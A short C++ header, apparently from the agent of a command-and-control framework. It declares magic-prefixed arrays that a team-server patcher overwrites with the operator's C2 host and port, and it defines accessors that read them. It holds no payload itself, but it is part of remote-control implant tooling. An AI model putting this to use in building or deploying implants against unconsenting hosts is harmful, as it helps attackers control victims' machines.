#pragma once
#include <cstdlib>

// Magic-prefixed configuration arrays defined in AgentConfig.cpp.
// The TeamServer patcher locates each array by its 8-byte magic prefix and
// overwrites the payload bytes that follow with the operator-supplied values.
extern volatile char AGENT_C2_HOST_CFG[72]; // 8-byte magic + 64-byte host string
extern volatile char AGENT_C2_PORT_CFG[16]; // 8-byte magic + 8-byte port string

inline const char* GetAgentHost() { return (const char*)(AGENT_C2_HOST_CFG + 8); }
inline int         GetAgentPort() { return atoi((const char*)(AGENT_C2_PORT_CFG + 8)); }
